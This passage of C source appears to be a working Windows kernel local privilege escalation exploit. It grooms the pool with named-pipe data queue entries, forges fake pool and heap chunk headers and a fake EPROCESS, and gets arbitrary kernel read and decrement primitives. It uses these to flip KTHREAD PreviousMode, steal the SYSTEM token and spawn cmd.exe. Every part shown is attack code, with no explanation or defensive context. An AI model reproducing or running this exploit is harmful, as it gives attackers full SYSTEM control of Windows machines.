    fake.np_data_queue_entry.QueueEntry.Flink = (LIST_ENTRY*)addrs->np_ccb_data_queue;
    fake.np_data_queue_entry.QueueEntry.Blink = (LIST_ENTRY*)addrs->np_ccb_data_queue;
    fake.np_data_queue_entry.Irp = (uintptr_t)&g_fake_irp;
    fake.np_data_queue_entry.ClientSecurityContext = 0;
    fake.np_data_queue_entry.DataEntryType = 0x1;
    fake.np_data_queue_entry.DataSize = 0xffffffff;
    fake.np_data_queue_entry.QuotaInEntry = 0xffffffff;

    uintptr_t ghost_ndqe;
    do {
        FreeNpDataQueueEntry(pipes->previous_chunk_pipe, VULN_CHUNK_SIZE);
        pipes->previous_chunk_pipe = AllocNpDataQueueEntry(VULN_CHUNK_SIZE, (char*)&fake, sizeof(vs_chunk_t));
        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->np_ccb_data_queue, (char*)&ghost_ndqe, 0x8);
    } while (ghost_ndqe == GHOST_CHUNK_MARKER_1);
}

int SetupArbitraryRead(exploit_pipes_t *pipes, exploit_addresses_t *addrs) {
    SprayNpDataQueueEntry(0x20000, VULN_CHUNK_SIZE, NULL, 0);
    pipe_group_t *victim = createChunkHoles();
    setCacheAlignedFlagOnVictimChunk();

    vs_chunk_t fake_vs;
    memset(&fake_vs, 0, sizeof(fake_vs));
    fake_vs.pool_header.PreviousSize = 0;
    fake_vs.pool_header.PoolIndex = 0;
    fake_vs.pool_header.BlockSize = (uint8_t)((GHOST_CHUNK_SIZE - SZ_VS_HDR) / 0x10);
    fake_vs.pool_header.PoolTag = 0x41414141;
    pipe_group_t *fake_ph = SprayNpDataQueueEntry(NUM_PIPES_SPRAY, VULN_CHUNK_SIZE, (char*)&fake_vs, sizeof(vs_chunk_t));

    enableLookaside(2, (size_t)VICTIM_CHUNK_SIZE, (size_t)GHOST_CHUNK_SIZE);
    if (!createGhostChunk(pipes, addrs, victim, fake_ph, &fake_vs)) return 0;
    enableLookaside(1, (size_t)VULN_CHUNK_SIZE);
    setFakeNpDataQueueEntry(pipes, addrs);
    return 1;
}

void ArbitraryRead(pipe_pair_t *ghost_pipe, uintptr_t where, char *out, size_t size) {
    char buf[0x1000];
    if (size >= 0x1000) size = 0xFFF;
    g_fake_irp.SystemBuffer = where;
    PeekDataFromPipe(ghost_pipe, buf, size);
    memcpy(out, buf, size);
}

uintptr_t locateVsSubSegment(exploit_pipes_t *pipes, exploit_addresses_t *addrs) {
    uintptr_t vs_addr = addrs->ghost_vs_chunk + NEXT_CHUNK_OFFSET;
    for (;;) {
        uint64_t enc[2];
        ArbitraryRead(&pipes->ghost_chunk_pipe, vs_addr,     (char*)&enc[0], sizeof(uint64_t));
        ArbitraryRead(&pipes->ghost_chunk_pipe, vs_addr + 8, (char*)&enc[1], sizeof(uint64_t));
        enc[0] ^= vs_addr ^ addrs->RtlpHpHeapGlobals;
        enc[1] ^= vs_addr ^ addrs->RtlpHpHeapGlobals;
        HEAP_VS_CHUNK_HEADER *h = (HEAP_VS_CHUNK_HEADER*)&enc;
        if (h->Allocated)
            return (vs_addr - ((uintptr_t)h->EncodedSegmentPageOffset << 12)) & ~0xfffull;
        vs_addr += (uintptr_t)h->UnsafeSize * 0x10;
    }
}

void constructFakeVsChunk(exploit_addresses_t *addrs, uintptr_t vs_sub_segment) {
    HEAP_VS_CHUNK_HEADER nh;
    memset(&nh, 0, sizeof(nh));
    nh.Allocated = 0x1;
    nh.UnsafePrevSize = PREV_CHUNK_OFFSET / 0x10;
    nh.UnsafeSize = NEXT_CHUNK_OFFSET / 0x10;
    nh.EncodedSegmentPageOffset = (uint8_t)(((addrs->ghost_vs_chunk - vs_sub_segment) >> 12) & 0xff);
    uint64_t *ph = (uint64_t*)&nh;
    ph[0] ^= addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;
    ph[1] ^= addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;

    memset(g_fpb_buf, 0, sizeof(g_fpb_buf));
    g_fake_process_billed_chunk->encoded_vs_header[0] = ph[0];
    g_fake_process_billed_chunk->encoded_vs_header[1] = ph[1];
    g_fake_process_billed_chunk->pool_header.PreviousSize = 0;
    g_fake_process_billed_chunk->pool_header.PoolIndex = 0;
    g_fake_process_billed_chunk->pool_header.BlockSize = 0x100 / 0x10;
    g_fake_process_billed_chunk->pool_header.PoolType = 8;
    g_fake_process_billed_chunk->pool_header.PoolTag = 0x42424242;
    g_fake_process_billed_chunk->np_data_queue_entry.QueueEntry.Flink = (LIST_ENTRY*)addrs->np_ccb_data_queue;
    g_fake_process_billed_chunk->np_data_queue_entry.QueueEntry.Blink = (LIST_ENTRY*)addrs->np_ccb_data_queue;
    g_fake_process_billed_chunk->np_data_queue_entry.Irp = 0;
    g_fake_process_billed_chunk->np_data_queue_entry.ClientSecurityContext = 0;
    g_fake_process_billed_chunk->np_data_queue_entry.DataEntryType = 0;
    g_fake_process_billed_chunk->np_data_queue_entry.DataSize = CALC_NDQE_DataSize(GHOST_CHUNK_SIZE);
    g_fake_process_billed_chunk->np_data_queue_entry.QuotaInEntry = CALC_NDQE_DataSize(GHOST_CHUNK_SIZE);
    g_fake_process_billed_chunk->np_data_queue_entry.unknown = 0;
    *(uint64_t*)((char*)&g_fake_process_billed_chunk->np_data_queue_entry + NDQE_DATA_OFFSET) = GHOST_CHUNK_MARKER_2;
}

int SetupArbitraryDecrement(exploit_pipes_t *pipes, exploit_addresses_t *addrs) {
    uintptr_t seg = locateVsSubSegment(pipes, addrs);
    constructFakeVsChunk(addrs, seg);
    return 1;
}

uintptr_t allocFakeEprocess(exploit_pipes_t *pipes, exploit_addresses_t *addrs, char *fake_eprocess_buf) {
    WriteDataToPipe(&pipes->previous_chunk_pipe, fake_eprocess_buf, FAKE_EPROCESS_SIZE);
    uintptr_t prev_vs = addrs->ghost_vs_chunk - PREV_CHUNK_OFFSET;
    uintptr_t prev_ndqe = prev_vs + SZ_VS_HDR + SZ_POOL_HDR;
    uintptr_t new_ndqe;
    ArbitraryRead(&pipes->ghost_chunk_pipe, prev_ndqe, (char*)&new_ndqe, 0x8);
    return new_ndqe + NDQE_DATA_OFFSET + FAKE_EPROCESS_OFFSET;
}

int setupFakeEprocess(char *buf, uintptr_t addr_to_decrement) {
    memset(buf, 0x41, FAKE_EPROCESS_SIZE);
    char *addr = buf + FAKE_EPROCESS_OFFSET;
    memset(addr + EPROCESS_Type_OFFSET, 0x3, 1);
    memcpy(addr + EPROCESS_QuotaBlock_OFFSET, &addr_to_decrement, sizeof(uint64_t));
    return 1;
}

void setFakeProcessBilled(exploit_pipes_t *pipes, exploit_addresses_t *addrs, uintptr_t fake_eprocess) {
    g_fake_process_billed_chunk->pool_header.ProcessBilled =
        fake_eprocess ^ addrs->ExpPoolQuotaCookie ^ (addrs->ghost_vs_chunk + SZ_VS_HDR);
    uintptr_t ghost_ndqe = 0;
    do {
        FreeNpDataQueueEntry(pipes->previous_chunk_pipe, VULN_CHUNK_SIZE);
        pipes->previous_chunk_pipe = AllocNpDataQueueEntry(VULN_CHUNK_SIZE, (char*)g_fake_process_billed_chunk, sizeof(vs_chunk_t) + 0x8);
        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->np_ccb_data_queue, (char*)&ghost_ndqe, 0x8);
    } while (ghost_ndqe != GHOST_CHUNK_MARKER_2);
}

int ArbitraryDecrement(exploit_pipes_t *pipes, exploit_addresses_t *addrs, uintptr_t addr_to_decrement) {
    char fake_eprocess_buf[0x1000]; memset(fake_eprocess_buf, 0, sizeof(fake_eprocess_buf));
    setupFakeEprocess(fake_eprocess_buf, addr_to_decrement - 0x1);
    uintptr_t fake_eprocess = allocFakeEprocess(pipes, addrs, fake_eprocess_buf);
    setFakeProcessBilled(pipes, addrs, fake_eprocess);
    FreeNpDataQueueEntry(pipes->ghost_chunk_pipe, GHOST_CHUNK_SIZE);
    return 1;
}

int SetupArbitraryWrite(exploit_pipes_t *pipes, exploit_addresses_t *addrs) {
    uintptr_t target = addrs->self_kthread + KTHREAD_PreviousMode_OFFSET;
    return ArbitraryDecrement(pipes, addrs, target);
}

uintptr_t Read64(uintptr_t address) {
    uintptr_t v = 0; SIZE_T n = 0;
    ReadProcessMemory(GetCurrentProcess(), (LPCVOID)address, &v, sizeof(v), &n);
    return v;
}
NTSTATUS Write64(uintptr_t address, uintptr_t value) {
    return pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)address, &value, sizeof(value), NULL);
}
NTSTATUS ArbitraryWrite(uintptr_t address, char *value, size_t size) {
    return pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)address, value, (ULONG)size, NULL);
}

uintptr_t findKernelBase(pipe_pair_t *ghost, exploit_addresses_t *addrs) {
    uintptr_t ghost_ndqe;
    ArbitraryRead(ghost, addrs->np_ccb_data_queue, (char*)&ghost_ndqe, 0x8);
    addrs->ghost_vs_chunk = ghost_ndqe - SZ_POOL_HDR - SZ_VS_HDR;

    uintptr_t file_object, device_object, driver_object, npfs_base, imp_ptr, ExFreePoolWithTag;
    ArbitraryRead(ghost, addrs->np_ccb_data_queue - NP_CCB_DataQueue_OFFSET + NP_CCB_FileObject_OFFSET, (char*)&file_object, 0x8);
    ArbitraryRead(ghost, file_object + FILE_OBJECT_DeviceObject_OFFSET, (char*)&device_object, 0x8);
    ArbitraryRead(ghost, device_object + DEVICE_OBJECT_DriverObject_OFFSET, (char*)&driver_object, 0x8);
    ArbitraryRead(ghost, driver_object + DRIVER_OBJECT_DriverStart_OFFSET, (char*)&npfs_base, 0x8);
    imp_ptr = npfs_base + g_Npfs_imp_ExFreePoolWithTag_RVA;
    ArbitraryRead(ghost, imp_ptr, (char*)&ExFreePoolWithTag, 0x8);
    return ExFreePoolWithTag - g_nt_ExFreePoolWithTag_RVA;
}

uintptr_t findSelfEprocess(pipe_pair_t *ghost, uintptr_t system_eprocess) {
    DWORD self_pid = GetCurrentProcessId();
    uintptr_t cur = system_eprocess;
    do {
        ArbitraryRead(ghost, cur + EPROCESS_ActiveProcessLinks_OFFSET, (char*)&cur, 0x8);
        cur -= EPROCESS_ActiveProcessLinks_OFFSET;
        uintptr_t pid = 0;
        ArbitraryRead(ghost, cur + EPROCESS_UniqueProcessId_OFFSET, (char*)&pid, 0x8);
        if (pid == self_pid) return cur;
    } while (cur != system_eprocess);
    return 0;
}

int leakKernelInfo(pipe_pair_t *ghost, exploit_addresses_t *addrs) {
    addrs->kernel_base = findKernelBase(ghost, addrs);
    ArbitraryRead(ghost, addrs->kernel_base + g_nt_ExpPoolQuotaCookie_RVA, (char*)&addrs->ExpPoolQuotaCookie, 0x8);
    ArbitraryRead(ghost, addrs->kernel_base + g_nt_RtlpHpHeapGlobals_RVA, (char*)&addrs->RtlpHpHeapGlobals, 0x8);
    ArbitraryRead(ghost, addrs->kernel_base + g_nt_PsInitialSystemProcess_RVA, (char*)&addrs->system_eprocess, 0x8);
    addrs->self_eprocess = findSelfEprocess(ghost, addrs->system_eprocess);
    ArbitraryRead(ghost, addrs->self_eprocess + EPROCESS_ThreadListHead_OFFSET, (char*)&addrs->self_kthread, 0x8);
    addrs->self_kthread -= KTHREAD_ThreadListEntry_OFFSET;
    return 1;
}

int FixVsChunkHeaders(exploit_addresses_t *addrs) {
    uint64_t h[2];
    uintptr_t prev = addrs->ghost_vs_chunk - PREV_CHUNK_OFFSET;
    h[0] = Read64(prev)       ^ prev ^ addrs->RtlpHpHeapGlobals;
    h[1] = Read64(prev + 0x8) ^ prev ^ addrs->RtlpHpHeapGlobals;
    ((HEAP_VS_CHUNK_HEADER*)&h)->UnsafeSize = PREV_CHUNK_OFFSET / 0x10;
    Write64(prev,       h[0] ^ prev ^ addrs->RtlpHpHeapGlobals);
    Write64(prev + 0x8, h[1] ^ prev ^ addrs->RtlpHpHeapGlobals);

    uintptr_t next = addrs->ghost_vs_chunk + NEXT_CHUNK_OFFSET;
    h[0] = Read64(next)       ^ next ^ addrs->RtlpHpHeapGlobals;
    h[1] = Read64(next + 0x8) ^ next ^ addrs->RtlpHpHeapGlobals;
    ((HEAP_VS_CHUNK_HEADER*)&h)->UnsafePrevSize = NEXT_CHUNK_OFFSET / 0x10;
    Write64(next,       h[0] ^ next ^ addrs->RtlpHpHeapGlobals);
    Write64(next + 0x8, h[1] ^ next ^ addrs->RtlpHpHeapGlobals);
    return 1;
}

int RestorePreviousMode(exploit_addresses_t *addrs) {
    char one = 0x01;
    ArbitraryWrite(addrs->self_kthread + KTHREAD_PreviousMode_OFFSET, &one, sizeof(char));
    return 1;
}

int CleanupPipes(exploit_pipes_t *pipes) {
    ClosePipePairHandles(&pipes->ghost_chunk_pipe);
    ClosePipePairHandles(&pipes->previous_chunk_pipe);
    return 1;
}

int SetupPrimitives(exploit_addresses_t *addrs) {
    exploit_pipes_t pipes; memset(&pipes, 0, sizeof(pipes));
    if (!SetupArbitraryRead(&pipes, addrs)) return 0;
    if (!leakKernelInfo(&pipes.ghost_chunk_pipe, addrs)) return 0;
    if (!SetupArbitraryDecrement(&pipes, addrs)) return 0;
    if (!SetupArbitraryWrite(&pipes, addrs)) return 0;
    if (!FixVsChunkHeaders(addrs)) return 0;
    if (!CleanupPipes(&pipes)) return 0;
    return 1;
}

int EscalatePrivileges(exploit_addresses_t *addrs) {
    uintptr_t system_token = Read64(addrs->system_eprocess + EPROCESS_Token_OFFSET);
    system_token &= ~0xFull;
    Write64(addrs->self_eprocess + EPROCESS_Token_OFFSET, system_token);
    return 1;
}

int main(void) {
    if (!InitializeWindowsApiWrappers()) return 1;
    if (!ResolveKernelRvas()) return 1;

    exploit_addresses_t addrs; memset(&addrs, 0, sizeof(addrs));
    if (!SetupPrimitives(&addrs)) return 1;
    if (!EscalatePrivileges(&addrs)) return 1;
    if (!RestorePreviousMode(&addrs)) return 1;

    system("cmd.exe");
    return 0;
}

```
